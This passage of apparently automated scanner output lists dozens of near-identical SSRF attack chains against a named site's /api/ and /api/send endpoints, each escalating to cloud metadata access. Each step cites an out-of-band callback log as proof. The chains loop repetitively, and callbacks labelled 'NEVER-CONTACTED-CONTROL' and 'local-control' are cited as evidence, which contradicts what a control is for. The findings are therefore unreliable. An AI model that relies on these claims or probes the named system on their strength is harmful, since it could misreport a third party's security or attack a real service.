  - internal_http → metadata_access: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — local-control · PoC: `OOB callback oob571a47f26f8c.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.811980+00:00`
- Chain: internal_http → internal_http → internal_http → internal_http → metadata_access
  - internal_http — https://www.infinitycapital.bh/api/ · PoC: `OOB callback oob17aecfd7c311.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.804324+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — https://www.infinitycapital.bh/api/send · PoC: `OOB callback oobdc3afb3004d6.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T22:29:51.136357+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — local-control · PoC: `OOB callback oob571a47f26f8c.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.811980+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — NEVER-CONTACTED-CONTROL · PoC: `OOB callback ooBB3F20F27D3B3.daU2P4GhgqAg02K5eMGgC5xU6hPh3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:49:01.101997+00:00`
  - internal_http → metadata_access: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — NEVER-CONTACTED-CONTROL · PoC: `OOB callback ooBB3F20F27D3B3.daU2P4GhgqAg02K5eMGgC5xU6hPh3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:49:01.101997+00:00`
- Chain: internal_http → internal_http → internal_http → internal_http → metadata_access
  - internal_http — https://www.infinitycapital.bh/api/ · PoC: `OOB callback oob17aecfd7c311.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.804324+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — https://www.infinitycapital.bh/api/send · PoC: `OOB callback oobdc3afb3004d6.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T22:29:51.136357+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — local-control · PoC: `OOB callback oob571a47f26f8c.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.811980+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — NEVER-CONTACTED-CONTROL · PoC: `OOB callback ooBB3F20F27D3B3.daU2P4GhgqAg02K5eMGgC5xU6hPh3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:49:01.101997+00:00`
  - internal_http → metadata_access: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — https://www.infinitycapital.bh/api/send · PoC: `OOB callback oobdc3afb3004d6.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T22:29:51.136357+00:00`
- Chain: internal_http → internal_http → internal_http → internal_http → metadata_access
  - internal_http — https://www.infinitycapital.bh/api/ · PoC: `OOB callback oob17aecfd7c311.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.804324+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — https://www.infinitycapital.bh/api/send · PoC: `OOB callback oobdc3afb3004d6.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T22:29:51.136357+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — NEVER-CONTACTED-CONTROL · PoC: `OOB callback ooBB3F20F27D3B3.daU2P4GhgqAg02K5eMGgC5xU6hPh3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:49:01.101997+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — local-control · PoC: `OOB callback oob571a47f26f8c.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.811980+00:00`
  - internal_http → metadata_access: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — local-control · PoC: `OOB callback oob571a47f26f8c.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.811980+00:00`
- Chain: internal_http → internal_http → internal_http → internal_http → metadata_access
  - internal_http — https://www.infinitycapital.bh/api/ · PoC: `OOB callback oob17aecfd7c311.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.804324+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — https://www.infinitycapital.bh/api/send · PoC: `OOB callback oobdc3afb3004d6.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T22:29:51.136357+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — NEVER-CONTACTED-CONTROL · PoC: `OOB callback ooBB3F20F27D3B3.daU2P4GhgqAg02K5eMGgC5xU6hPh3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:49:01.101997+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — local-control · PoC: `OOB callback oob571a47f26f8c.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.811980+00:00`
  - internal_http → metadata_access: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — NEVER-CONTACTED-CONTROL · PoC: `OOB callback ooBB3F20F27D3B3.daU2P4GhgqAg02K5eMGgC5xU6hPh3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:49:01.101997+00:00`
- Chain: internal_http → internal_http → internal_http → internal_http → metadata_access
  - internal_http — https://www.infinitycapital.bh/api/ · PoC: `OOB callback oob17aecfd7c311.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.804324+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — https://www.infinitycapital.bh/api/send · PoC: `OOB callback oobdc3afb3004d6.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T22:29:51.136357+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — NEVER-CONTACTED-CONTROL · PoC: `OOB callback ooBB3F20F27D3B3.daU2P4GhgqAg02K5eMGgC5xU6hPh3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:49:01.101997+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — local-control · PoC: `OOB callback oob571a47f26f8c.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.811980+00:00`
  - internal_http → metadata_access: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — https://www.infinitycapital.bh/api/send · PoC: `OOB callback oobdc3afb3004d6.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T22:29:51.136357+00:00`
- Chain: internal_http → internal_http → internal_http → metadata_access
  - internal_http — https://www.infinitycapital.bh/api/ · PoC: `OOB callback oob17aecfd7c311.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.804324+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — local-control · PoC: `OOB callback oob571a47f26f8c.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.811980+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — NEVER-CONTACTED-CONTROL · PoC: `OOB callback ooBB3F20F27D3B3.daU2P4GhgqAg02K5eMGgC5xU6hPh3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:49:01.101997+00:00`
  - internal_http → metadata_access: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — local-control · PoC: `OOB callback oob571a47f26f8c.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.811980+00:00`
- Chain: internal_http → internal_http → internal_http → metadata_access
  - internal_http — https://www.infinitycapital.bh/api/ · PoC: `OOB callback oob17aecfd7c311.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.804324+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — local-control · PoC: `OOB callback oob571a47f26f8c.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.811980+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — NEVER-CONTACTED-CONTROL · PoC: `OOB callback ooBB3F20F27D3B3.daU2P4GhgqAg02K5eMGgC5xU6hPh3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:49:01.101997+00:00`
  - internal_http → metadata_access: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — NEVER-CONTACTED-CONTROL · PoC: `OOB callback ooBB3F20F27D3B3.daU2P4GhgqAg02K5eMGgC5xU6hPh3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:49:01.101997+00:00`
- Chain: internal_http → internal_http → internal_http → metadata_access
  - internal_http — https://www.infinitycapital.bh/api/ · PoC: `OOB callback oob17aecfd7c311.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.804324+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — local-control · PoC: `OOB callback oob571a47f26f8c.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.811980+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — NEVER-CONTACTED-CONTROL · PoC: `OOB callback ooBB3F20F27D3B3.daU2P4GhgqAg02K5eMGgC5xU6hPh3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:49:01.101997+00:00`
  - internal_http → metadata_access: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — https://www.infinitycapital.bh/api/send · PoC: `OOB callback oobdc3afb3004d6.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T22:29:51.136357+00:00`
- Chain: internal_http → internal_http → internal_http → metadata_access
  - internal_http — https://www.infinitycapital.bh/api/ · PoC: `OOB callback oob17aecfd7c311.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.804324+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — local-control · PoC: `OOB callback oob571a47f26f8c.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.811980+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — https://www.infinitycapital.bh/api/send · PoC: `OOB callback oobdc3afb3004d6.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T22:29:51.136357+00:00`
  - internal_http → metadata_access: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — local-control · PoC: `OOB callback oob571a47f26f8c.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.811980+00:00`
- Chain: internal_http → internal_http → internal_http → metadata_access
  - internal_http — https://www.infinitycapital.bh/api/ · PoC: `OOB callback oob17aecfd7c311.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.804324+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — local-control · PoC: `OOB callback oob571a47f26f8c.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.811980+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — https://www.infinitycapital.bh/api/send · PoC: `OOB callback oobdc3afb3004d6.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T22:29:51.136357+00:00`
  - internal_http → metadata_access: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — NEVER-CONTACTED-CONTROL · PoC: `OOB callback ooBB3F20F27D3B3.daU2P4GhgqAg02K5eMGgC5xU6hPh3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:49:01.101997+00:00`
- Chain: internal_http → internal_http → internal_http → metadata_access
  - internal_http — https://www.infinitycapital.bh/api/ · PoC: `OOB callback oob17aecfd7c311.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.804324+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — local-control · PoC: `OOB callback oob571a47f26f8c.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.811980+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — https://www.infinitycapital.bh/api/send · PoC: `OOB callback oobdc3afb3004d6.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T22:29:51.136357+00:00`
  - internal_http → metadata_access: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — https://www.infinitycapital.bh/api/send · PoC: `OOB callback oobdc3afb3004d6.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T22:29:51.136357+00:00`
- Chain: internal_http → internal_http → internal_http → metadata_access
  - internal_http — https://www.infinitycapital.bh/api/ · PoC: `OOB callback oob17aecfd7c311.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.804324+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — NEVER-CONTACTED-CONTROL · PoC: `OOB callback ooBB3F20F27D3B3.daU2P4GhgqAg02K5eMGgC5xU6hPh3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:49:01.101997+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — local-control · PoC: `OOB callback oob571a47f26f8c.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.811980+00:00`
  - internal_http → metadata_access: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — local-control · PoC: `OOB callback oob571a47f26f8c.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.811980+00:00`
- Chain: internal_http → internal_http → internal_http → metadata_access
  - internal_http — https://www.infinitycapital.bh/api/ · PoC: `OOB callback oob17aecfd7c311.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.804324+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — NEVER-CONTACTED-CONTROL · PoC: `OOB callback ooBB3F20F27D3B3.daU2P4GhgqAg02K5eMGgC5xU6hPh3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:49:01.101997+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — local-control · PoC: `OOB callback oob571a47f26f8c.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.811980+00:00`
  - internal_http → metadata_access: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — NEVER-CONTACTED-CONTROL · PoC: `OOB callback ooBB3F20F27D3B3.daU2P4GhgqAg02K5eMGgC5xU6hPh3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:49:01.101997+00:00`
- Chain: internal_http → internal_http → internal_http → metadata_access
  - internal_http — https://www.infinitycapital.bh/api/ · PoC: `OOB callback oob17aecfd7c311.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.804324+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — NEVER-CONTACTED-CONTROL · PoC: `OOB callback ooBB3F20F27D3B3.daU2P4GhgqAg02K5eMGgC5xU6hPh3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:49:01.101997+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — local-control · PoC: `OOB callback oob571a47f26f8c.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.811980+00:00`
  - internal_http → metadata_access: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — https://www.infinitycapital.bh/api/send · PoC: `OOB callback oobdc3afb3004d6.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T22:29:51.136357+00:00`
- Chain: internal_http → internal_http → internal_http → metadata_access
  - internal_http — https://www.infinitycapital.bh/api/ · PoC: `OOB callback oob17aecfd7c311.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.804324+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — NEVER-CONTACTED-CONTROL · PoC: `OOB callback ooBB3F20F27D3B3.daU2P4GhgqAg02K5eMGgC5xU6hPh3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:49:01.101997+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — https://www.infinitycapital.bh/api/send · PoC: `OOB callback oobdc3afb3004d6.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T22:29:51.136357+00:00`
  - internal_http → metadata_access: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — local-control · PoC: `OOB callback oob571a47f26f8c.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.811980+00:00`
- Chain: internal_http → internal_http → internal_http → metadata_access
  - internal_http — https://www.infinitycapital.bh/api/ · PoC: `OOB callback oob17aecfd7c311.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.804324+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — NEVER-CONTACTED-CONTROL · PoC: `OOB callback ooBB3F20F27D3B3.daU2P4GhgqAg02K5eMGgC5xU6hPh3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:49:01.101997+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — https://www.infinitycapital.bh/api/send · PoC: `OOB callback oobdc3afb3004d6.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T22:29:51.136357+00:00`
  - internal_http → metadata_access: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — NEVER-CONTACTED-CONTROL · PoC: `OOB callback ooBB3F20F27D3B3.daU2P4GhgqAg02K5eMGgC5xU6hPh3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:49:01.101997+00:00`
- Chain: internal_http → internal_http → internal_http → metadata_access
  - internal_http — https://www.infinitycapital.bh/api/ · PoC: `OOB callback oob17aecfd7c311.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.804324+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — NEVER-CONTACTED-CONTROL · PoC: `OOB callback ooBB3F20F27D3B3.daU2P4GhgqAg02K5eMGgC5xU6hPh3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:49:01.101997+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — https://www.infinitycapital.bh/api/send · PoC: `OOB callback oobdc3afb3004d6.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T22:29:51.136357+00:00`
  - internal_http → metadata_access: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — https://www.infinitycapital.bh/api/send · PoC: `OOB callback oobdc3afb3004d6.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T22:29:51.136357+00:00`
- Chain: internal_http → internal_http → internal_http → metadata_access
  - internal_http — https://www.infinitycapital.bh/api/ · PoC: `OOB callback oob17aecfd7c311.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.804324+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — https://www.infinitycapital.bh/api/send · PoC: `OOB callback oobdc3afb3004d6.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T22:29:51.136357+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — local-control · PoC: `OOB callback oob571a47f26f8c.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.811980+00:00`
  - internal_http → metadata_access: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — local-control · PoC: `OOB callback oob571a47f26f8c.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.811980+00:00`
- Chain: internal_http → internal_http → internal_http → metadata_access
  - internal_http — https://www.infinitycapital.bh/api/ · PoC: `OOB callback oob17aecfd7c311.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.804324+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — https://www.infinitycapital.bh/api/send · PoC: `OOB callback oobdc3afb3004d6.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T22:29:51.136357+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — local-control · PoC: `OOB callback oob571a47f26f8c.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.811980+00:00`
  - internal_http → metadata_access: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — NEVER-CONTACTED-CONTROL · PoC: `OOB callback ooBB3F20F27D3B3.daU2P4GhgqAg02K5eMGgC5xU6hPh3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:49:01.101997+00:00`
- Chain: internal_http → internal_http → internal_http → metadata_access
  - internal_http — https://www.infinitycapital.bh/api/ · PoC: `OOB callback oob17aecfd7c311.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.804324+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — https://www.infinitycapital.bh/api/send · PoC: `OOB callback oobdc3afb3004d6.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T22:29:51.136357+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — local-control · PoC: `OOB callback oob571a47f26f8c.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.811980+00:00`
  - internal_http → metadata_access: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — https://www.infinitycapital.bh/api/send · PoC: `OOB callback oobdc3afb3004d6.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T22:29:51.136357+00:00`
- Chain: internal_http → internal_http → internal_http → metadata_access
  - internal_http — https://www.infinitycapital.bh/api/ · PoC: `OOB callback oob17aecfd7c311.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.804324+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — https://www.infinitycapital.bh/api/send · PoC: `OOB callback oobdc3afb3004d6.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T22:29:51.136357+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — NEVER-CONTACTED-CONTROL · PoC: `OOB callback ooBB3F20F27D3B3.daU2P4GhgqAg02K5eMGgC5xU6hPh3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:49:01.101997+00:00`
  - internal_http → metadata_access: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — local-control · PoC: `OOB callback oob571a47f26f8c.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.811980+00:00`
- Chain: internal_http → internal_http → internal_http → metadata_access
  - internal_http — https://www.infinitycapital.bh/api/ · PoC: `OOB callback oob17aecfd7c311.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.804324+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — https://www.infinitycapital.bh/api/send · PoC: `OOB callback oobdc3afb3004d6.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T22:29:51.136357+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — NEVER-CONTACTED-CONTROL · PoC: `OOB callback ooBB3F20F27D3B3.daU2P4GhgqAg02K5eMGgC5xU6hPh3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:49:01.101997+00:00`
  - internal_http → metadata_access: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — NEVER-CONTACTED-CONTROL · PoC: `OOB callback ooBB3F20F27D3B3.daU2P4GhgqAg02K5eMGgC5xU6hPh3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:49:01.101997+00:00`
- Chain: internal_http → internal_http → internal_http → metadata_access
